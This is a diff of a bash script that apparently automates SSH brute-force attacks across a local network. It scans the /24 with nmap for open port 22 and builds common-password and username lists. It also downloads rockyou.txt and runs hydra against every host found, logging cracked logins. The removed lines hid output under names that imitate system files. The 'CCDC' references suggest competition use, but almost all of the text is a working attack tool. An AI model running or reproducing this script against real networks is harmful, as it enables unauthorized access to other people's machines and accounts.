@@ -62,45 +62,83 @@ function neo(){
 # checking for files and dirs
 ###########################################################################################
 function bones(){
-#checking for wordlist dir
+###################################################
+### checking for 'official' lists #################
+	#checking for wordlist dir
 	if [[ ! -d $listsDir ]]; then
 		printf "\nCouldn't find wordlist dir. Creating \n\t["$listsDir"]\n"
 		command mkdir -p "$listsDir"/metasploit
 	fi
 
-#checking for 'rockyou.txt' password list
+	#checking for 'rockyou.txt' password list
 	if [[ ! -f "$pwListFull" ]]; then
 		printf "\n"
-	#checking for the .gz
+		#checking for the .gz
 		if [[ -f "$pwListFull".gz ]]; then
 			printf "\nExtracting rockyou.txt\n"
 			command tar -xf "$pwListFull".gz -C "$listsDir"
 		else
-		#downloading rockyou.txt
+			#downloading rockyou.txt
 			printf "\nCouldn't find rockyou.txt or rockyou.txt.gz\nDownloading it to:\n\t["$pwListFull"]\n\n\n"
 			command curl -L -o "$pwListFull" https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt
 		fi
 	fi
 
-#checking for 'unix_users.txt'
+	#checking for 'unix_users.txt'
 	if [[ ! -f "$userListUnix" ]]; then
-	#downloading unix_users list
+		#downloading unix_users list
 		printf "\n\n\nCouldn't find unix_users file\nDownloading it to:\n\t["$userListUnix"]\n\n\n"
 		command curl -L -o "$userListUnix" https://raw.githubusercontent.com/rapid7/metasploit-framework/master/data/wordlists/unix_users.txt
 		printf "\n\n\n"
 	fi
+
+##################################################
+### checking for/creating custom lists ###########
+
+	#file locations
+		hydraOutput="/tmp/hydraOutput"
+		crackedLogins="logins"
+		listLiveHosts="listTargets"
+		listPwsBasic="listPwsBasic"
+		listUsersBasic="listUsersBasic"
+
+	### gathering live HOSTS
+	#gathering local network ID
+		netID="$(route -n | tail -n +3 | cut -d" " -f1 | grep -P "[^^0\.].+\.0")"
+	#if 'targets' file doesn't exist, then make it
+		if [[ ! -f "$listLiveHosts" ]]; then
+			printf "\nGenerating list of pingable hosts on the network, might take short while (~2 min)\n\n------\n\n"
+			printf "$(nmap -p 22 $netID/24 -oG - | awk '/22\/open/{print $2}')\n" > "$listLiveHosts"
+			command sed -i "/$(hostname -I | tr -d " ")/d" "$listLiveHosts"
+		fi
+		printf "\tTargets List:\n$(cat $listLiveHosts)\n"
+	### basic list of PASSWORDS
+	#if 'listPwsBasic' doesnt' exist, then make it
+		if [[ ! -f "$listPwsBasic" ]]; then
+			printf "123456\n12345\n123456789\npassword\niloveyou\nprincess\n1234567\nrockyou\n12345678\nabc123\nnicole\ndaniel\nbabygirl\nmonkey\nlovely\njessica\n654321\nmichael\nashley\nqwerty\n111111\niloveu\n000000\nmichelle\ntigger\nsunshine\nchocolate\npassword1\nsoccer\nanthony\nfriends\nbutterfly\npurple\nangel\njordan\nliverpool\njustin\nloveme\nfuckyou\n123123\nfootball\nsecret\nandrea\ncarlos\njennifer\njoshua\nbubbles\n1234567890\nsuperman\nhannah\n" > $listPwsBasic
+			#printf "P@ssw0rd\npassword\nPASSWORD\npassw0rd\np@ssword\nP@ssword\nqwerty\nQWERTY\nqwert\nQWERT\nwasd\nWASD\nCCDC\nccdc\n" > $listPwsBasic
+			#pwListFull		#defined elsewhere
+		fi
+	### basic list of USERNAMES
+	#if 'listUsersBasic' doesn't exist, then make it
+		if [[ ! -f "$listUsersBasic" ]]; then
+			printf "student\nccdc\nuser\nghost\ncartman\nstan\nkyle\nkenny\npcprincipal\nreality\njack\nkate\nrenko\nclay\nturner\nkylie\nbecca\njo\nallie\nsarah\nsaryn\nrhino\nnidus\nlazors\n" > $listUsersBasic
+			#printf "student\nccdc\nuser\n" > $listUsersBasic
+			#userListUnix	#defined elsewhere
+		fi
 }
 ###########################################################################################
 # check/install/configure apps
 ###########################################################################################
 function meat(){
-# wanted app lists
+##################################################
+### checking for/installing tools ################
 	command="hydra hashcat john nmap curl net-tools"
 	installing=""
-	updated=0
+	updated=1
 	scriptPath="$(pwd)/$(basename $0)"
 
-	#### updating repo list, if it hasn't already been updated recently
+	### updating repo list, if it hasn't already been updated recently
 		if [[ $updated == 0 ]]; then
 			command apt update
 		# updates the script so it knows it doesn't need to check again
@@ -121,10 +159,10 @@ function meat(){
 		fi
 
 	# where important lists are stored
-		printf "\n\tUsername List:\n"
-		printf "\n\t\t["$userListUnix"]\n\n"
-		printf "\n\tPassword List:\n"
-		printf "\n\t\t["$pwListFull"]\n\n"
+		#printf "\n\tUsername List:\n"
+		#printf "\n\t\t["$userListUnix"]\n\n"
+		#printf "\n\tPassword List:\n"
+		#printf "\n\t\t["$pwListFull"]\n\n"
 
 }
 ###########################################################################################
@@ -134,26 +172,7 @@ function brute(){
 	# tmp files
 		#********add remove all tmp files at the end **************************************************
 		#make sure these are all tmp files
-		tmpFiles=""$hydraOutput" "$crackedLogins" "$liveHosts" "$pwListBasic" "$userListBasic""
-	# cracked info file(s)
-		hydraOutput="/tmp/initrd.img-4.15.0-38-generic"
-		crackedLogins="./logins"
-	# gathering local network ID info (hopefully)
-		netID="$(route -n | tail -n +3 | cut -d" " -f1 | grep -P "[^^0\.].+\.0")"
-	# gathering live HOSTS
-		liveHosts="/tmp/zlxoiqa"
-		printf "\nGenerating list of pingable hosts on the network, might take short while (~2 min)\n------\n\n"
-		printf "$(nmap -p 22 $netID/24 -oG - | awk '/22\/open/{print $2}')\n" > "$liveHosts"
-		command sed -i "/$(hostname -I | tr -d " ")/d" "$liveHosts"
-		printf "\tTargets List:\n$(cat $liveHosts)\n"
-	# basic list of PASSWORDS
-		pwListBasic="/tmp/flfidoo"
-		printf "P@ssw0rd\npassword\nPASSWORD\npassw0rd\np@ssword\nP@ssword\nqwerty\nQWERTY\nqwert\nQWERT\nwasd\nWASD\nCCDC\nccdc\n" > $pwListBasic
-		#pwListFull
-	# basic list of USERNAMES
-		userListBasic="/tmp/dosielsxi"
-		printf "root\nstudent\nccdc\nuser" > $userListBasic
-		#userListUnix
+		tmpFiles=""$hydraOutput" "$crackedLogins" "$listLiveHosts" "$listPwsBasic" "$listUsersBasic""
 
 	### testing all login info for all IPs
 		#**** if hydra.restore ask if skip ****************************************************
@@ -162,7 +181,7 @@ function brute(){
 :
 		fi
 		#***** if not success with basic, then do full ****************************************
-		command hydra -o "$hydraOutput" -L "$userListBasic" -P "$pwListBasic" -M "$liveHosts" ssh
+		command hydra -o "$hydraOutput" -L "$listUsersBasic" -P "$listPwsBasic" -M "$listLiveHosts" ssh
 		command sed -i '/^#/d' "$hydraOutput"
 		if [ -s $hydraOutput ]; then
 			printf "\nCleaning up output\n"
